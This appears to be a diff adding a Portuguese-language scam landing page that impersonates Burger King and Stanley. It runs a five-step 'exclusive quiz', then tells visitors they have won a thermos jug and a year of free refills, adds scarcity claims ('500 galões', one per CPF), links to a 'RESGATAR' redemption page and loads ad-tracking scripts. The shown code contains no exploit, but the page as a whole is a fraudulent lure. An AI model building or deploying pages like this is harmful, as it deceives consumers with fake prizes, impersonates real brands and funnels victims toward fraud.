@@ -1,0 +1,408 @@
+<!DOCTYPE html><html lang="pt-br">
+<head>
+<script src="js/latest.js" async="" defer=""></script>
+<script async="" defer="" src="js/pixel.js"></script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <link rel="stylesheet" href="css/bootstrap.min.css">
+  <link rel="stylesheet" href="css/style.css">
+  <link rel="stylesheet" href="css/all.min.css">
+  <script src="js/jquery-3.7.1.min.js" crossorigin="anonymous"></script>
+  <link rel="icon" href="images/eletroicon.png" type="image/x-icon">
+  <link rel="apple-touch-icon" sizes="32x32" href="favicon.html">
+  <script src="js/bootstrap.bundle.min.js"></script>
+  <title>Avaliação Burger King</title>
+</head>
+<body>
+  <header>
+    <i class="fa-solid fa-bars" style="color: white"></i>
+    <!-- <img src="assets/images/google_logo.svg" alt=""> -->
+    <img src="images/bklogo.png" alt="">
+    <span id="saldo" style="margin-left: auto"></span>
+  </header>
+  <main>
+    <div class="card pergunta01" id="pergunta01">
+      <div class="card__logo">
+        <img src="images/1.jpg" alt="">
+      </div>
+      <div class="card__satisfacao">
+        <h2><strong>De 0 a 5, qual seu grau de familiaridade com a marca Stanley?</strong></h2>
+        <div class="card__gradeContainer">
+          <div class="card__grade" id="card__grade1" onclick="toggleCard(this)">
+            <i class="fa-regular fa-star" id="star1"></i>
+          </div>
+          <div class="card__grade" id="card__grade2" onclick="toggleCard(this)">
+            <i class="fa-regular fa-star" id="star2"></i>
+          </div>
+          <div class="card__grade" id="card__grade3" onclick="toggleCard(this)">
+            <i class="fa-regular fa-star" id="star3"></i>
+          </div>
+          <div class="card__grade" id="card__grade4" onclick="toggleCard(this)">
+            <i class="fa-regular fa-star" id="star4"></i>
+          </div>
+          <div class="card__grade" id="card__grade5" onclick="toggleCard(this)">
+            <i class="fa-regular fa-star" id="star5"></i>
+          </div>
+        </div>
+        <div class="card__gradeDescricao">
+          <p>Baixa</p>
+          <p>Alta</p>
+        </div>
+      </div>
+      <div class="card__resposta">
+        <h2>
+          <strong>Qual é sua maior preocupação na hora de adquirir um produto Stanley?</strong>
+        </h2>
+        <div class="resposta__gradeContainer">
+          <div class="resposta__grade resposta1" onclick="toggleResponse(this, 'resposta1')">
+            <p onclick="scrollToDown()">Preço</p>
+          </div>
+          <div class="resposta__grade resposta1" onclick="toggleResponse(this, 'resposta1')">
+            <p onclick="scrollToDown()">Qualidade</p>
+          </div>
+        </div>
+      </div>
+      <div class="card__resposta">
+        <h2><strong>Qual tipo de bebida você vai usar com Galão Térmico?</strong></h2>
+        <div class="resposta__gradeContainer">
+          <div class="resposta__grade resposta2" onclick="toggleResponse(this, 'resposta2')">
+            <p>Quente</p>
+          </div>
+          <div class="resposta__grade resposta2" onclick="toggleResponse(this, 'resposta2')">
+            <p>Fria</p>
+          </div>
+        </div>
+      </div>
+      <button class="card__enviarResposta" id="enviarResposta" onclick="pergunta01()" disabled="">
+        Enviar avaliação
+      </button>
+    </div>
+    <div class="card pergunta02" id="pergunta02" style="display: none">
+      <div class="card__logo">
+        <img src="images/2.jpg" alt="">
+      </div>
+      <div class="card__satisfacao">
+        <h2>
+          <strong>De 0 a 5, como você classificaria a qualidade dos produtos Stanley?</strong>
+        </h2>
+        <div class="card__gradeContainer">
+          <div class="card__grade" id="card__grade1" onclick="toggleCard(this)">
+            <i class="fa-regular fa-star" id="star1"></i>
+          </div>
+          <div class="card__grade" id="card__grade2" onclick="toggleCard(this)">
+            <i class="fa-regular fa-star" id="star2"></i>
+          </div>
+          <div class="card__grade" id="card__grade3" onclick="toggleCard(this)">
+            <i class="fa-regular fa-star" id="star3"></i>
+          </div>
+          <div class="card__grade" id="card__grade4" onclick="toggleCard(this)">
+            <i class="fa-regular fa-star" id="star4"></i>
+          </div>
+          <div class="card__grade" id="card__grade5" onclick="toggleCard(this)">
+            <i class="fa-regular fa-star" id="star5"></i>
+          </div>
+        </div>
+        <div class="card__gradeDescricao">
+          <p>Baixa</p>
+          <p>Alta</p>
+        </div>
+      </div>
+      <div class="card__resposta">
+        <h2>
+          <strong>Você conhece os produtos Stanley?</strong>
+        </h2>
+        <div class="resposta__gradeContainer">
+          <div class="resposta__grade resposta1" onclick="toggleResponse(this, 'resposta1')">
+            <p onclick="scrollToDown()">Sim</p>
+          </div>
+          <div class="resposta__grade resposta1" onclick="toggleResponse(this, 'resposta1')">
+            <p onclick="scrollToDown()">Não</p>
+          </div>
+        </div>
+      </div>
+      <div class="card__resposta">
+        <h2><strong>Você sabia que os produtos Stanley são reconhecidos mundialmente pela sua durabilidade e eficiência térmica?</strong>
+</h2>
+        <div class="resposta__gradeContainer">
+          <div class="resposta__grade resposta2" onclick="toggleResponse(this, 'resposta2')">
+            <p>Sim, eu sabia</p>
+          </div>
+          <div class="resposta__grade resposta2" onclick="toggleResponse(this, 'resposta2')">
+            <p>Não, primeira vez que vou testar</p>
+          </div>
+        </div>
+      </div>
+      <button class="card__enviarResposta" id="enviarResposta" onclick="pergunta02()" disabled="">
+        Enviar avaliação
+      </button>
+    </div>
+
+    <div class="card pergunta03" id="pergunta03" style="display: none">
+      <div class="card__logo">
+        <img src="images/3.webp" alt="">
+      </div>
+      <div class="card__satisfacao">
+        <h2><strong>De 0 a 5, Você acha que a capacidade térmica de um produto Stanley influencia na sua qualidade?</strong></h2>
+        <div class="card__gradeContainer">
+          <div class="card__grade" id="card__grade1" onclick="toggleCard(this)">
+            <i class="fa-regular fa-star" id="star1"></i>
+          </div>
+          <div class="card__grade" id="card__grade2" onclick="toggleCard(this)">
+            <i class="fa-regular fa-star" id="star2"></i>
+          </div>
+          <div class="card__grade" id="card__grade3" onclick="toggleCard(this)">
+            <i class="fa-regular fa-star" id="star3"></i>
+          </div>
+          <div class="card__grade" id="card__grade4" onclick="toggleCard(this)">
+            <i class="fa-regular fa-star" id="star4"></i>
+          </div>
+          <div class="card__grade" id="card__grade5" onclick="toggleCard(this)">
+            <i class="fa-regular fa-star" id="star5"></i>
+          </div>
+        </div>
+        <div class="card__gradeDescricao">
+          <p>Baixa</p>
+          <p>Alta</p>
+        </div>
+      </div>
+      <div class="card__resposta">
+        <h2><strong>Você já conhece nosso novo galão personalizado "O BK É FOGO", em parceria com o Burger King?</strong></h2>
+        <div class="resposta__gradeContainer">
+          <div class="resposta__grade resposta1" onclick="toggleResponse(this, 'resposta1')">
+            <p onclick="scrollToDown()">Sim</p>
+          </div>
+          <div class="resposta__grade resposta1" onclick="toggleResponse(this, 'resposta1')">
+            <p onclick="scrollToDown()">Não</p>
+          </div>
+        </div>
+      </div>
+      <div class="card__resposta">
+        <h2>
+          <strong>Entre os seguintes modelos, qual você escolheria?</strong>
+        </h2>
+        <div class="resposta__gradeContainer">
+          <div class="resposta__grade resposta2" onclick="toggleResponse(this, 'resposta2')">
+            <p>Stanley Convecional</p>
+          </div>
+          <div class="resposta__grade resposta2" onclick="toggleResponse(this, 'resposta2')">
+            <p>O BK É FOGO (Personalizado BK)</p>
+          </div>
+        </div>
+      </div>
+      <button class="card__enviarResposta" id="enviarResposta" onclick="pergunta03()" disabled="">
+        Enviar avaliação
+      </button>
+    </div>
+
+    <div class="card pergunta04" id="pergunta04" style="display: none">
+      <div class="card__logo">
+        <img src="images/4.jpg" alt="">
+      </div>
+      <div class="card__satisfacao">
+        <h2><strong>De 0 a 5, qual a probabilidade de você comprar um Produto Stanley?</strong></h2>
+        <div class="card__gradeContainer">
+          <div class="card__grade" id="card__grade1" onclick="toggleCard(this)">
+            <i class="fa-regular fa-star" id="star1"></i>
+          </div>
+          <div class="card__grade" id="card__grade2" onclick="toggleCard(this)">
+            <i class="fa-regular fa-star" id="star2"></i>
+          </div>
+          <div class="card__grade" id="card__grade3" onclick="toggleCard(this)">
+            <i class="fa-regular fa-star" id="star3"></i>
+          </div>
+          <div class="card__grade" id="card__grade4" onclick="toggleCard(this)">
+            <i class="fa-regular fa-star" id="star4"></i>
+          </div>
+          <div class="card__grade" id="card__grade5" onclick="toggleCard(this)">
+            <i class="fa-regular fa-star" id="star5"></i>
+          </div>
+        </div>
+        <div class="card__gradeDescricao">
+          <p>Baixa</p>
+          <p>Alta</p>
+        </div>
+      </div>
+      <div class="card__resposta">
+        <h2><strong>Você já escolheu algum produto Stanley por conta do seu design?</strong></h2>
+        <div class="resposta__gradeContainer">
+          <div class="resposta__grade resposta1" onclick="toggleResponse(this, 'resposta1')">
+            <p onclick="scrollToDown()">Sim</p>
+          </div>
+          <div class="resposta__grade resposta1" onclick="toggleResponse(this, 'resposta1')">
+            <p onclick="scrollToDown()">Não</p>
+          </div>
+        </div>
+      </div>
+      <div class="card__resposta">
+        <h2><strong>Entre os seguintes ML, qual você considera mais essencial para você?</strong></h2>
+        <div class="resposta__gradeContainer">
+          <div class="resposta__grade resposta2" onclick="toggleResponse(this, 'resposta2')">
+            <p>COPO DE 473ML</p>
+          </div>
+          <div class="resposta__grade resposta2" onclick="toggleResponse(this, 'resposta2')">
+            <p>GALÃO DE 1.9 LITROS</p>
+          </div>
+        </div>
+      </div>
+      <button class="card__enviarResposta" id="enviarResposta" onclick="pergunta04()" disabled="">
+        Enviar avaliação
+      </button>
+    </div>
+
+    <div class="card pergunta05" id="pergunta05" style="display: none">
+      <div class="card__logo">
+        <img src="images/5.webp" alt="">
+      </div>
+      <div class="card__satisfacao">
+        <h2>
+          <strong>De 0 a 5, o quão feliz você ficaria de ganhar um galão personalizado "O BK É FOGO", para compartilhar momentos especiais com seus amigos?</strong>
+        </h2>
+        <div class="card__gradeContainer">
+          <div class="card__grade" id="card__grade1" onclick="toggleCard(this)">
+            <i class="fa-regular fa-star" id="star1"></i>
+          </div>
+          <div class="card__grade" id="card__grade2" onclick="toggleCard(this)">
+            <i class="fa-regular fa-star" id="star2"></i>
+          </div>
+          <div class="card__grade" id="card__grade3" onclick="toggleCard(this)">
+            <i class="fa-regular fa-star" id="star3"></i>
+          </div>
+          <div class="card__grade" id="card__grade4" onclick="toggleCard(this)">
+            <i class="fa-regular fa-star" id="star4"></i>
+          </div>
+          <div class="card__grade" id="card__grade5" onclick="toggleCard(this)">
+            <i class="fa-regular fa-star" id="star5"></i>
+          </div>
+        </div>
+        <div class="card__gradeDescricao">
+          <p>Baixa</p>
+          <p>Alta</p>
+        </div>
+      </div>
+      <div class="card__resposta">
+        <h2>
+         <strong>Você sabia que os produtos Stanley são ideais para manter suas bebidas na temperatura perfeita durante churrascos e encontros ao ar livre, proporcionando uma experiência única e agradável?</strong>
+        </h2>
+        <div class="resposta__gradeContainer">
+          <div class="resposta__grade resposta1" onclick="toggleResponse(this, 'resposta1')">
+            <p onclick="scrollToDown()">Sim</p>
+          </div>
+          <div class="resposta__grade resposta1" onclick="toggleResponse(this, 'resposta1')">
+            <p onclick="scrollToDown()">Não</p>
+          </div>
+        </div>
+      </div>
+      <div class="card__resposta">
+        <h2><strong>Você gostaria de receber 1 ano de refil grátis diretamente do Burguer King?</strong></h2>
+        <div class="resposta__gradeContainer">
+          <div class="resposta__grade resposta2" onclick="toggleResponse(this, 'resposta2')">
+            <p>Eu quero</p>
+          </div>
+          <div class="resposta__grade resposta2" onclick="toggleResponse(this, 'resposta2')">
+            <p>Não quero</p>
+          </div>
+        </div>
+      </div>
+      <button class="card__enviarResposta" id="enviarResposta" onclick="pergunta05()" disabled="">
+        Enviar avaliação
+      </button>
+    </div>
+    <div class="card finalizacao" id="finalizacao" style="display: none">
+      <div class="finalizacao__titulo">
+	  <div class="card__logo">
+        <img src="images/6.jpg" alt="">
+      </div>
+        <h1>PARABÉNS! FALTA POUCO PARA RESGATAR SEU GALÃO BK É FOGO! 🔥</h1>
+      </div>
+      <div class="finalizacao__trofeu">
+      </div>
+      <div class="finalizacao__descricao">
+        <p>
+          Você concluiu  o nosso Quiz Exclusivo Burguer King + Stanley! Como agradecimento, você ganhou um
+          <b>1 Ano de Refil em qualquer uma das franquias Burguer King, precisando apenas do seu Galão! 😍</b>! Clique no botão <b>RESGATAR</b> abaixo para
+          resgatar seu prêmio e aproveitar essa oferta Exclusiva do BK.
+        </p>
+        <p>
+          Agradecemos pela sua participação e esperamos que desfrute do GALÃO STANLEY BK com qualidade e praticidade que a Stanley oferece.<br><br>Com carinho, <br>Equipe Burguer King.
+        </p>
+      </div>
+      <div class="finalizacao__botao">
+        <a href="file:///home/usuario/websites/BKSITEproprio/bkstalley.site/bbkstan/resgate/index.html"><button><i class="fa-solid fa-gift"></i>  RESGATAR</button></a>
+      </div>
+    </div>
+
+    <button data-bs-toggle="modal" data-bs-target="#modal01" id="popup" style="display: none"></button>
+
+    <div class="modal" tabindex="-1" id="modal01">
+      <div class="modal-dialog modal-dialog-centered">
+        <div class="modal-content">
+          <div class="card apresentacao">
+            <h2>
+              Quiz Exclusivo Burger King 🍔
+            </h2>
+            <p>
+              Quer saber como garantir seu <strong>GALÃO STANLEY BK e 1 ANO DE FREE REFILL???</strong><br>
+			  é necessário <strong>RESPONDER</strong> nossa pesquisa do Programa <strong>Stanley.</strong><br>
+			  <strong>O resgate do refil pode ser feito em qualquer BK!</strong><br>
+			  <strong>RESGATE VALIDO APENAS 1 POR CPF. ✅</strong><br>
+			  Promoção válida até durarem os <strong>estoques de 500 Galões Stanley BK®️</strong><br>
+              <strong>Pronto para começar nossa pesquisa?</strong>
+            </p>
+            <button type="button" data-bs-dismiss="modal">COMEÇAR</button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <script src="js/hideAllExcept.js"></script>
+  <script src="js/selectedCard.js"></script>
+  <script src="js/selectedResponse.js"></script>
+  <script src="js/buttonCheck.js"></script>
+  <script src="js/popup.js"></script>
+  <script src="js/sendResponse.js"></script>
+  <script>
+    $(document).ready(function () {
+      let data = new Date();
+
+      var date = data.getDate();
+      var month = [
+        "Janeiro",
+        "Fevereiro",
+        "Março",
+        "Abril",
+        "Maio",
+        "Junho",
+        "Julho",
+        "Agosto",
+        "Setembro",
+        "Outubro",
+        "Novembro",
+        "Dezembro",
+      ][data.getMonth()];
+      var year = data.getFullYear();
+
+      $("#todayDate").html(`${date} de ${month} de ${year}**`);
+    });
+  </script>
+  <script type="text/javascript" src="js/crypto-js.min.js"></script>
+
+  <script>
+    var popup = document.getElementById("popup");
+
+    document.addEventListener("DOMContentLoaded", function () {
+      popup.click();
+    });
+  </script>
+
+<script
+  src="../../cdn.utmify.com.br/scripts/utms/latest.js"
+  async
+  defer
+></script>
+
+<script>
+</script>
+
+</body>
+</html>
